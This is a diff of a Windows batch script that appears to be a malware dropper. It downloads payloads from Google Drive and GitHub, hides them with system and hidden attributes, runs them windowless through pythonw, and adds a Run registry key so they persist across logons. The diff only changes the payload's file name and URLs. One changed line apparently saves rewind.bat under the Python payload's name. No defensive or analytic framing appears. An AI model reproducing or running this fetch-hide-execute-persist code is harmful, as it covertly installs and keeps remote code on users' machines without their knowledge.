@@ -12,13 +12,13 @@ IF EXIST "C:\Users\%USERNAME%\configuration\" (
 )
 
 :hote
-IF EXIST "C:\Users\%USERNAME%\configuration\wxappx.pyw" (
-	start "" pythonw "C:\Users\%USERNAME%\configuration\wxappx.pyw"
+IF EXIST "C:\Users\%USERNAME%\configuration\wxappx.pyz" (
+	start "" pythonw "C:\Users\%USERNAME%\configuration\wxappx.pyz"
 	goto rewind_1
 ) ELSE (
-	curl -L -o "C:\Users\%USERNAME%\configuration\wxappx.pyw" "https://drive.usercontent.google.com/download?id=1BWI_g0rYHTo2byBmz1ASoc6a3aH9tLSl&export=download&authuser=0&confirm=t&uuid=68837b1c-e076-4f9e-bfb0-764fb92212f6&at=AIrpjvMjI7TtfYSOANWXDDcgxurH:1736532294502"
-	attrib +s +h "C:\Users\%USERNAME%\configuration\wxappx.pyw"
-	start "" pythonw "C:\Users\%USERNAME%\configuration\wxappx.pyw"
+	curl -L -o "C:\Users\%USERNAME%\configuration\wxappx.pyz" "https://drive.usercontent.google.com/download?id=1uT5XJGvanUxCfrqYj3Ga39mGXVOKCQVA&export=download&authuser=0&confirm=t&uuid=6fb57f32-3b23-45a4-a518-71105ecfc7e8&at=AIrpjvP7oaZpNPZr6TCmMyeYdnm5:1738753310639"
+	attrib +s +h "C:\Users\%USERNAME%\configuration\wxappx.pyz"
+	start "" pythonw "C:\Users\%USERNAME%\configuration\wxappx.pyz"
 	goto rewind_1
 )
 
@@ -26,7 +26,7 @@ IF EXIST "C:\Users\%USERNAME%\configuration\wxappx.pyw" (
 IF EXIST "C:\Users\%USERNAME%\configuration\rewind.bat" (
 	goto rewind_2
 ) ELSE (
-	curl -L -o "C:\Users\%USERNAME%\configuration\wxappx.pyw" "https://raw.githubusercontent.com/Unyther/woukpakxpoux/main/rewind.bat"
+	curl -L -o "C:\Users\%USERNAME%\configuration\wxappx.pyz" "https://raw.githubusercontent.com/Unyther/woukpakxpoux/main/rewind.bat"
 	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v RewindConfig /t REG_SZ /d "C:\Users\%USERNAME%\configuration\rewind.bat" /f
 	attrib +s +h "C:\Users\%USERNAME%\configuration\rewind.bat"
 	goto rewind_2
